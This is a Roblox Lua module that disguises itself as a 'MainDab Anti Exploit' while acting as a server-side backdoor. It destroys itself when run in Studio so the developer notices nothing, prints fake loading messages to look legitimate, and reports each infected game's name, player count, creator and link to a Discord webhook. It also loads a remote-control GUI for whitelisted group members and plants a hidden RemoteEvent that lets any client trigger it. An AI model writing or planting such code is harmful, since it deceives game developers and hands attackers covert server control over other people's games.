local module = {}
function module.hail()

	local run = game:GetService("RunService")
	if run:IsStudio()then -- Check if it's in studio so the developer won't notice anything funny
		print("Studio") -- this line is unessesary, i kept it there for debugging
		script:Destroy()	

	else


		local http = game:GetService("HttpService") -- obvious


		if not game.Workspace:FindFirstChild("Sent") then -- if there isn't a value in workspace called sent then it will make one, this is made so that the webhooks can't be abused from here
			local sent = Instance.new("BoolValue", game.Workspace)
			sent.Name = "Sent" -- obvious
		end
		local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) -- getting player count
		function getPlrCount()
			return #game.Players:GetPlayers()
		end
		print("------ MainDab Anti Exploit | Running Version 2.0 ------") -- to make it look legit
		print("MainDab Anti Exploit | Loaded module 1/2")
		game.Players.PlayerAdded:Connect(function(player)
			if player:IsInGroup(groupidhere) then -- if the player is in a group in roblox, then the ss gui will open for them 
				require(guiidhere).load(player.Name)
				print("New user joined*") -- makes it look legit. the "*" is just to show myself if the player is in the whitelist group or not. this part is unessesary.
			else
				print("New user joined")
			end
		end)
		local CheckHttp = function() -- dirty trick to check if http is enabled
			local Set = false
			pcall(function() -- new function
				if http:GetAsync("https://www.google.com/") then -- try to open up google.com, if fails to do so then assume http isn't enabled
					Set = not Set
				end
			end)
			return Set
		end

		if CheckHttp() then -- if the server returns that it has http enabled via the checkhttp function above
			local players = game.Players:GetPlayers() -- get amount of players
			local creatorname = game.Players:GetNameFromUserIdAsync(game.CreatorId) -- get game creator username
			local id = game.PlaceId -- game id
      -- below is the DATA that gets sent via Webhook. it's an embed just letting you know.
			local data = 
				{
				["content"] = "",
				["embeds"] = {
					{
						["title"] = "**New serversided game found!**",
						["description"] = "Click the link below.",
						["type"] = "rich",
						["color"] = tonumber(0x1e9c61),
						["thumbnail"] = {
							["url"] = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..id.."&fmt=png&wd=768&ht=432",
						},
						["fields"] = {
							{
								["name"] = "**Game info**",
								["value"] = "Name: ***"..GetName.Name.."***\nServer Players: ***"..#players.."***\nGame Creator: ***"..creatorname.."***",
								["inline"] = false
							},
							{
								["name"] = "**Game link**",
								["value"] = "[Click](https://www.roblox.com/games/"..game.PlaceId..")",
								["inline"] = false	
							},
							{
								["name"] = "Note from Main_EX", -- some additional comments
								["value"] = "Fuck Black Magic 2 and their community on Roblox! Check out <#766316340473888768> for more info why!",
								-- Fuck Black Magic 2 and their community on Roblox! Check out <#739002891708399618> for more info why!
								["inline"] = false
							}

						}
					}
				}
			}
			local Data = http:JSONEncode(data) -- to encode it in the JSON format since discord only accepts webhooks in JSON format (i think?)
			if game.Workspace.Sent.Value == false then -- This is to prevent spam from occuring, as this has been abused in the past.


				http:PostAsync("discordwebhookurlhere", Data) -- games get sent here, sends a post request to discord. fun fact - most webhooks are usually sent using POST.
				--http:PostAsync("discordwebhookurlhere", Data) -- If you want an additional place to log games
				game.Workspace.Sent.Value = true -- obviously
			end
      -- printing to make it look legit
			print("MainDab Anti Exploit | Loaded module 2/2")
			print("MainDab Anti Exploit | Finishing up...")
			print("MainDab Anti Exploit | Anti Exploit loaded!") 
		else  -- if the game isn't http
			local h = Instance.new("Hint")
			h.Parent = game.Workspace 
			h.Text = "MainDab Anti Exploit : Please allow HTTP Requests in Game Settings!" -- hint's aren't the best option but I have no choice
		end

		local Remote = Instance.new("RemoteEvent", game.JointsService) -- MainDab's SS can also be called via executing code from the client. In this case, running the code game.JointsService.WeldRequest:FireServer("gui") from the client will make the UI show for the client who ran it. 
		Remote.Name = "WeldRequest"
		Remote.OnServerEvent:Connect(function(plr, key)
			if key == "gui" then
				require( ).load(plr.Name) -- Code to load MainDab's SS, the empty brackets are the ID for the GUI
			end
		end)
	end
end
return module	-- to end code
